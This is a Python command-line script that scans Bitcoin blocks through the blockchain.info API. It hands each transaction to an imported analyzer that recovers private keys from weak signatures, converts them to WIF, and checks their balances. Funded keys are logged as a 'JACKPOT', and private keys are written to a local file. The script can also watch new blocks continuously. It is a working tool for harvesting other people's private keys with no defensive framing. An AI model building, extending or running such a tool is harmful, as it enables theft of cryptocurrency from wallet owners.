
#!/usr/bin/env python3
"""
Block Transaction Hash Searcher
Searches for vulnerable signatures in Bitcoin blocks and converts to WIF keys
"""

import requests
import logging
import time
import sys
from typing import Dict, List, Optional
from btc_analyzer import BTCAnalyzer
from utils import private_key_to_wif, public_key_to_p2pkh_address
from ecdsa import SigningKey, SECP256k1

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class BlockTransactionHunter:
    def __init__(self):
        self.analyzer = BTCAnalyzer()
        self.found_keys = []
        self.scanned_blocks = 0
        self.scanned_transactions = 0
        
    def search_block_by_hash(self, block_hash: str) -> Dict:
        """Search a specific block by hash for vulnerable transactions"""
        try:
            logger.info(f"🔍 Searching block: {block_hash}")
            
            # Fetch block data
            response = requests.get(f"https://blockchain.info/rawblock/{block_hash}", timeout=15)
            if response.status_code != 200:
                logger.error(f"Failed to fetch block {block_hash}: {response.status_code}")
                return {'error': f'Failed to fetch block: {response.status_code}'}
            
            block_data = response.json()
            transactions = block_data.get('tx', [])
            
            logger.info(f"📦 Block contains {len(transactions)} transactions")
            
            return self._analyze_block_transactions(block_hash, transactions)
            
        except Exception as e:
            logger.error(f"Error searching block {block_hash}: {e}")
            return {'error': str(e)}
    
    def search_block_by_number(self, block_height: int) -> Dict:
        """Search a specific block by height/number for vulnerable transactions"""
        try:
            logger.info(f"🔍 Searching block height: {block_height}")
            
            # Get block hash from height
            response = requests.get(f"https://blockchain.info/block-height/{block_height}?format=json", timeout=15)
            if response.status_code != 200:
                logger.error(f"Failed to fetch block height {block_height}: {response.status_code}")
                return {'error': f'Failed to fetch block height: {response.status_code}'}
            
            height_data = response.json()
            blocks = height_data.get('blocks', [])
            
            if not blocks:
                logger.error(f"No blocks found at height {block_height}")
                return {'error': 'No blocks found at height'}
            
            # Use the first block (main chain)
            block_hash = blocks[0]['hash']
            logger.info(f"📍 Block height {block_height} -> hash: {block_hash}")
            
            return self.search_block_by_hash(block_hash)
            
        except Exception as e:
            logger.error(f"Error searching block height {block_height}: {e}")
            return {'error': str(e)}
    
    def search_range_starting_from_block(self, start_block: str, max_blocks: int = 100) -> Dict:
        """Search multiple blocks starting from a given block hash or height"""
        try:
            results = {
                'start_block': start_block,
                'blocks_scanned': 0,
                'transactions_scanned': 0,
                'vulnerable_transactions': [],
                'recovered_keys': [],
                'balances_found': []
            }
            
            # Determine if input is hash or height
            if start_block.isdigit():
                current_height = int(start_block)
                logger.info(f"🚀 Starting search from block height: {current_height}")
            else:
                # Get height from hash
                response = requests.get(f"https://blockchain.info/rawblock/{start_block}", timeout=15)
                if response.status_code != 200:
                    return {'error': 'Invalid block hash or height'}
                block_info = response.json()
                current_height = block_info.get('height', 0)
                logger.info(f"🚀 Starting search from block hash: {start_block} (height: {current_height})")
            
            # Search blocks sequentially
            for i in range(max_blocks):
                logger.info(f"📍 Scanning block {current_height + i} ({i+1}/{max_blocks})")
                
                block_result = self.search_block_by_number(current_height + i)
                
                if 'error' in block_result:
                    logger.warning(f"Skipping block {current_height + i}: {block_result['error']}")
                    continue
                
                results['blocks_scanned'] += 1
                results['transactions_scanned'] += block_result.get('transactions_scanned', 0)
                
                # Add vulnerable transactions
                if block_result.get('vulnerable_transactions'):
                    results['vulnerable_transactions'].extend(block_result['vulnerable_transactions'])
                
                # Add recovered keys
                if block_result.get('recovered_keys'):
                    results['recovered_keys'].extend(block_result['recovered_keys'])
                    
                    # Check if any have balance
                    for key_info in block_result['recovered_keys']:
                        if key_info.get('balance', '0.00000000') != '0.00000000':
                            results['balances_found'].append(key_info)
                            logger.critical(f"💰 BALANCE FOUND! Address: {key_info['address']}, Balance: {key_info['balance']} BTC")
                
                # If we found keys with balance, we can stop or continue based on preference
                if results['balances_found']:
                    logger.critical(f"🎯 SUCCESS! Found {len(results['balances_found'])} addresses with balance!")
                    # Uncomment next line to stop after first balance found
                    # break
                
                # Small delay to avoid rate limiting
                time.sleep(0.1)
            
            return results
            
        except Exception as e:
            logger.error(f"Error in range search: {e}")
            return {'error': str(e)}
    
    def _analyze_block_transactions(self, block_hash: str, transactions: List[Dict]) -> Dict:
        """Analyze all transactions in a block for vulnerabilities"""
        results = {
            'block_hash': block_hash,
            'transactions_scanned': len(transactions),
            'vulnerable_transactions': [],
            'recovered_keys': []
        }
        
        for tx_index, tx in enumerate(transactions):
            tx_hash = tx.get('hash')
            if not tx_hash:
                continue
            
            logger.debug(f"🔍 Analyzing transaction {tx_index + 1}/{len(transactions)}: {tx_hash}")
            
            try:
                # Analyze transaction for vulnerabilities
                analysis_result = self.analyzer.analyze_transaction(tx_hash)
                
                if analysis_result.get('private_keys_found', 0) > 0:
                    logger.info(f"🚨 VULNERABLE TRANSACTION FOUND: {tx_hash}")
                    
                    vuln_info = {
                        'tx_hash': tx_hash,
                        'tx_index': tx_index,
                        'private_keys_found': analysis_result.get('private_keys_found', 0),
                        'weak_signatures': analysis_result.get('weak_signatures', [])
                    }
                    results['vulnerable_transactions'].append(vuln_info)
                    
                    # Extract recovered keys with WIF and balance info
                    for weak_sig in analysis_result.get('weak_signatures', []):
                        if weak_sig.get('type') == 'recovered_key':
                            key_info = {
                                'tx_hash': tx_hash,
                                'private_key_hex': weak_sig.get('private_key'),
                                'wif': weak_sig.get('wif'),
                                'address': weak_sig.get('address'),
                                'balance': weak_sig.get('balance'),
                                'key_type': weak_sig.get('key_type')
                            }
                            results['recovered_keys'].append(key_info)
                            
                            logger.info(f"🔑 Recovered Key: {key_info['wif']}")
                            logger.info(f"🏠 Address: {key_info['address']}")
                            logger.info(f"💰 Balance: {key_info['balance']} BTC")
                            
            except Exception as e:
                logger.debug(f"Error analyzing transaction {tx_hash}: {e}")
                continue
        
        logger.info(f"✅ Block analysis complete: {len(results['vulnerable_transactions'])} vulnerable transactions found")
        return results
    
    def continuous_search_from_latest(self):
        """Continuously search new blocks starting from the latest block"""
        logger.info("🔄 Starting continuous search from latest block...")
        
        try:
            # Get latest block
            response = requests.get('https://blockchain.info/latestblock', timeout=10)
            if response.status_code != 200:
                logger.error("Failed to get latest block")
                return
            
            latest_block = response.json()
            current_height = latest_block.get('height', 0)
            
            logger.info(f"🚀 Starting continuous search from block height: {current_height}")
            
            while True:
                try:
                    # Search current block
                    result = self.search_block_by_number(current_height)
                    
                    if 'error' not in result:
                        if result.get('recovered_keys'):
                            logger.critical(f"🎯 Found {len(result['recovered_keys'])} recovered keys in block {current_height}!")
                            for key_info in result['recovered_keys']:
                                if key_info.get('balance', '0.00000000') != '0.00000000':
                                    logger.critical(f"💰💰💰 JACKPOT! Balance found: {key_info['balance']} BTC")
                                    self._save_findings(key_info)
                    
                    # Move to next block
                    current_height += 1
                    
                    # Wait for next block (approximately 10 minutes)
                    logger.info(f"⏳ Waiting for next block... (current: {current_height})")
                    time.sleep(600)  # 10 minutes
                    
                except KeyboardInterrupt:
                    logger.info("🛑 Search stopped by user")
                    break
                except Exception as e:
                    logger.error(f"Error in continuous search: {e}")
                    time.sleep(30)  # Wait 30 seconds before retrying
                    continue
                    
        except Exception as e:
            logger.error(f"Failed to start continuous search: {e}")
    
    def _save_findings(self, key_info: Dict):
        """Save important findings to a file"""
        try:
            with open('vulnerable_keys_found.txt', 'a') as f:
                f.write(f"\n--- VULNERABLE KEY FOUND ---\n")
                f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Transaction: {key_info.get('tx_hash', 'Unknown')}\n")
                f.write(f"Private Key (Hex): {key_info.get('private_key_hex', 'Unknown')}\n")
                f.write(f"WIF: {key_info.get('wif', 'Unknown')}\n")
                f.write(f"Address: {key_info.get('address', 'Unknown')}\n")
                f.write(f"Balance: {key_info.get('balance', 'Unknown')} BTC\n")
                f.write(f"Key Type: {key_info.get('key_type', 'Unknown')}\n")
                f.write("=" * 50 + "\n")
                
            logger.info(f"💾 Findings saved to vulnerable_keys_found.txt")
            
        except Exception as e:
            logger.error(f"Failed to save findings: {e}")

def main():
    """Main function for command line usage"""
    hunter = BlockTransactionHunter()
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python block_transaction_hunter.py <block_hash_or_height>")
        print("  python block_transaction_hunter.py <start_block> <max_blocks>")
        print("  python block_transaction_hunter.py --continuous")
        print("")
        print("Examples:")
        print("  python block_transaction_hunter.py 000000000000000000014dd25cd472e3373a2e0c4b4e1636f29c0d774ec63f40")
        print("  python block_transaction_hunter.py 800000")
        print("  python block_transaction_hunter.py 800000 50")
        print("  python block_transaction_hunter.py --continuous")
        return
    
    if sys.argv[1] == '--continuous':
        hunter.continuous_search_from_latest()
    elif len(sys.argv) == 3:
        # Range search
        start_block = sys.argv[1]
        max_blocks = int(sys.argv[2])
        result = hunter.search_range_starting_from_block(start_block, max_blocks)
        print(f"\n🎯 SEARCH COMPLETE!")
        print(f"Blocks scanned: {result.get('blocks_scanned', 0)}")
        print(f"Transactions scanned: {result.get('transactions_scanned', 0)}")
        print(f"Vulnerable transactions: {len(result.get('vulnerable_transactions', []))}")
        print(f"Recovered keys: {len(result.get('recovered_keys', []))}")
        print(f"Keys with balance: {len(result.get('balances_found', []))}")
    else:
        # Single block search
        block_input = sys.argv[1]
        if block_input.isdigit():
            result = hunter.search_block_by_number(int(block_input))
        else:
            result = hunter.search_block_by_hash(block_input)
        
        if 'error' in result:
            print(f"❌ Error: {result['error']}")
        else:
            print(f"\n🎯 SEARCH COMPLETE!")
            print(f"Transactions scanned: {result.get('transactions_scanned', 0)}")
            print(f"Vulnerable transactions: {len(result.get('vulnerable_transactions', []))}")
            print(f"Recovered keys: {len(result.get('recovered_keys', []))}")

if __name__ == "__main__":
    main()
